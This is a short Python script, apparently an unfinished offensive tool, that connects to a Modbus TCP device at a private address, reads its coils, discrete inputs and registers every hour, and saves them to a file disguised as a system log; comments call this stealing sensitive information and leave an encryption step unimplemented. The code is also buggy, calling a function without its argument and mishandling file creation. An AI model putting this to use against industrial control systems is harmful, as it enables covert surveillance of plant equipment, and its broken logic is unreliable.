from datetime import datetime, timedelta
import time
from pymodbus import ModbusTcpClient

def main():
    #Create a false log file
    f = open("~/.config/syslogs", "x")

    #If the file name does not currently exist
    if f:
        while 1:
            #Set the next execution to occur in one hour
            nextEx = datetime.now() + timedelta(hours=1)

            #DO THE MODBUS WRITING IN HERE TO WITHDRAW SENSITIVE INFO
            stealInfo()
            encryptInfo()

            #Have the program sleep and wait for its designated time to execute
            while datetime.now() < nextEx:
                time.sleep(1)
    #If the file name already exists
    else:
        #Append to the existing file
        f = open("~/.config/syslogs","a")
        while 1:
            #Set the next execution to occur in one hour
            nextEx = datetime.now() + timedelta(hours=1)

            #DO THE MODBUS WRITING IN HERE TO WITHDRAW SENSITIVE INFO
            stolenInfo = stealInfo()
            f.write(stolenInfo)

            #Have the program sleep and wait for its designated time to execute
            while datetime.now() < nextEx:
                time.sleep(1)
        

def stealInfo():
    #Set current targeted device; MODIFY TO TAKE AS PARAMETER?
    curClient = ModbusTcpClient("192.168.100.5",port="5502")

    #Collect info from the server's registers; adjust COUNT to collect from more registers
    coilInfo = curClient.read_coils(address=0,count=10)
    discInputInfo = curClient.read_discrete_inputs(address=0,count=10)
    holdRegisterInfo = curClient.read_holding_registers(address=0,count=10)
    inpRegisterInfo = curClient.read_input_registers(address=0,count=10)

    clientInfo = f"{datetime.now()}: Coils = {coilInfo}; Discrete Inputs = {discInputInfo}; Holding Registers = {holdRegisterInfo}; Input Registers = {inpRegisterInfo}\n"

    #Return the extracted data
    return clientInfo

#TO BE IMPLEMENTED
def encryptInfo(info):

    #Return the encrypted data
    return

main()
